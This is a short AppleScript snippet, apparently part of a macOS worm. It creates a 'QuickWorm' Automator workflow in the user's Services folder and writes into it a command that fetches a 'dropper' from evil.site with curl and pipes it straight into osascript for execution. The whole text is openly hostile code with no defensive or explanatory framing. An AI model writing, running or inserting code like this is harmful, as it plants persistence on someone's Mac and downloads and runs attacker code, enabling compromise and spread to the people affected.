-- Create an Automator app that runs the worm
do shell script "mkdir -p ~/Library/Services/QuickWorm.workflow/Contents"
do shell script "echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?><plist version=\"1.0\"><dict><key>AMApplicationBuild</key><string>Automator</string><key>actions</key><array><dict><key>AMActionClass</key><string>RunAppleScript</string><key>AMParameters</key><dict><key>script</key><string>do shell script \"curl http://evil.site/dropper | osascript -\"</string></dict></dict></array></dict></plist>' > ~/Library/Services/QuickWorm.workflow/Contents/document.wflow"
